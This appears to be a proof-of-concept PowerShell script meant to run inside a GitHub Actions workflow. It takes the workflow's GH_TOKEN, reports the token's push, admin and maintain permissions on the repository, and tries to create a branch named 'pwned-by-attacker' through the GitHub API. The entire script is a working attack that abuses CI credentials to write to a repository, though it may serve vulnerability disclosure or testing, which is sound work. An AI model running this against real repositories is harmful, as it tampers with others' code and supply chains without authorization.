$ErrorActionPreference = "Stop"
$h = @{ Authorization = "Bearer $env:GH_TOKEN"; "X-GitHub-Api-Version" = "2022-11-28"; Accept = "application/vnd.github+json" }
$repo = $env:GITHUB_REPOSITORY
$perms = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo" -Headers $h
Write-Host ("GAB-POC-TOKEN-PERMISSIONS: push=" + $perms.permissions.push + " admin=" + $perms.permissions.admin + " maintain=" + $perms.permissions.maintain)
$body = @{ ref = "refs/heads/pwned-by-attacker"; sha = $env:GITHUB_SHA } | ConvertTo-Json
try {
  $r = Invoke-RestMethod -Method Post -Uri "https://api.github.com/repos/$repo/git/refs" -Headers $h -Body $body
  Write-Host ("GAB-POC-ATTACKER-PUSHED-BRANCH: " + $r.ref + " @ " + $r.object.sha.Substring(0,8))
} catch {
  Write-Host ("GAB-POC-BRANCH-PUSH-FAILED: " + $_.Exception.Message)
}
